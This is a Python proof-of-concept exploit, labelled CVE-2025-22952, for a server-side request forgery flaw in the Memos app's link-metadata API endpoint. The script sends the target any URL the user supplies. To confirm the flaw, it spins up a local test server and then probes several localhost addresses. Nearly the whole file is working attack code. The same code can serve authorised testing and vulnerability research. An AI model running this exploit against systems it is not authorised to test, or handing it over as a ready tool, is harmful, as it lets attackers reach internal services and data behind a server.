#!/usr/bin/env python3
import requests
import argparse
import sys
import threading
import http.server
import socketserver
import time

class SSRFTestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        response = f"""<html>
<head><title>SSRF_INTERNAL_SERVICE</title></head>
<meta name="description" content="SSRF vulnerability confirmed - internal service accessed">
<body>Internal service response</body>
</html>"""
        self.wfile.write(response.encode())
    
    def log_message(self, format, *args):
        pass

def start_test_server(port):
    with socketserver.TCPServer(("0.0.0.0", port), SSRFTestHandler) as httpd:
        httpd.handle_request()

def exploit_ssrf(target_url, ssrf_url):
    endpoint = f"{target_url}/api/v1/markdown/link:metadata"
    params = {"link": ssrf_url}
    
    try:
        response = requests.get(endpoint, params=params, timeout=10)
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        return None, str(e)

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-22952 Memos SSRF PoC")
    parser.add_argument("--target", "-t", default="http://localhost:5230", help="Target memos URL")
    parser.add_argument("--ssrf-url", "-u", help="URL to fetch via SSRF")
    parser.add_argument("--test-port", "-p", type=int, default=8888, help="Port for internal test server")
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    
    if args.ssrf_url:
        print(f"[*] Testing SSRF with URL: {args.ssrf_url}")
        status, response = exploit_ssrf(args.target, args.ssrf_url)
        if status:
            print(f"[+] Response status: {status}")
            print(f"[+] Response body: {response}")
            if "title" in response.lower():
                print("[+] SSRF vulnerability confirmed!")
                return 0
        else:
            print(f"[-] Request failed: {response}")
            return 1
    else:
        import socket
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            pass
        
        internal_url = f"http://{local_ip}:{args.test_port}/"
        print(f"[*] Starting internal test server on port {args.test_port}")
        print(f"[*] Internal URL: {internal_url}")
        
        server_thread = threading.Thread(target=start_test_server, args=(args.test_port,))
        server_thread.daemon = True
        server_thread.start()
        time.sleep(1)
        
        print(f"[*] Exploiting SSRF to access internal service...")
        status, response = exploit_ssrf(args.target, internal_url)
        
        if status:
            print(f"[+] Response status: {status}")
            print(f"[+] Response body: {response}")
            if "SSRF_INTERNAL_SERVICE" in response:
                print("[+] SSRF vulnerability confirmed! Internal service accessed successfully.")
                return 0
            elif "title" in response.lower():
                print("[+] SSRF vulnerability confirmed!")
                return 0
        else:
            print(f"[-] Request failed: {response}")
        
        print("[*] Testing with localhost variants...")
        test_urls = [
            "http://127.0.0.1:5230/",
            "http://localhost:5230/",
            "http://[::1]:5230/",
        ]
        
        for url in test_urls:
            print(f"[*] Testing: {url}")
            status, response = exploit_ssrf(args.target, url)
            if status and "memos" in response.lower():
                print(f"[+] SSRF confirmed with internal access to: {url}")
                print(f"[+] Response: {response}")
                return 0
    
    print("[-] SSRF exploitation failed")
    return 1

if __name__ == "__main__":
    sys.exit(main())
